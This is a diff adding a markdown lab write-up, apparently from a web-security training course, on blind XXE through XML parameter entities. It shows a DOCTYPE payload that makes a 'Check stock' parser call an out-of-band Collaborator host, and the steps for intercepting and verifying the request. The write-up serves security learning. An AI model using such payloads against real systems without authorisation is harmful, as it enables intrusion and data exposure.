@@ -1,0 +1,42 @@
+Blind XXE with Out-of-Band Interaction via Parameter Entities
+
+**Category**: XXE
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+- This lab demonstrates a blind XXE vulnerability where normal external entities are blocked, but parameter entities can be used to bypass restrictions.
+- The application parses XML input for the "Check stock" feature but does not display unexpected values directly.
+- By using parameter entities in the XML DOCTYPE, it is possible to trigger out-of-band DNS and HTTP requests.
+- Burp Collaborator is used to detect these interactions and confirm the vulnerability.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Intercept the Request
+- Used Burp Suite to intercept the POST request triggered by clicking "Check stock" on a product page.
+- The request body contains XML data with product and store IDs.
+
+### 2. Modify XML Payload
+- Added a DOCTYPE declaration with a parameter entity referencing a Burp Collaborator payload.
+- Structure added before the root element `<stockCheck>`:
+
+```xml
+<!DOCTYPE stockCheck [
+  <!ENTITY % xxe SYSTEM "http://collaborator">
+  %xxe;
+]>
+Replaced collaborator with the Collaborator URL 
+
+3. Send Modified Request
+Sent the modified XML with parameter entity definitions.
+
+The parser resolved the parameter entity, causing a DNS and HTTP request to the Collaborator server.
+
+4. Verify Interaction
+Checked the Collaborator tab and clicked "Poll now" to view DNS/HTTP callbacks.
+
+The presence of callbacks confirmed the vulnerability and solved the lab.
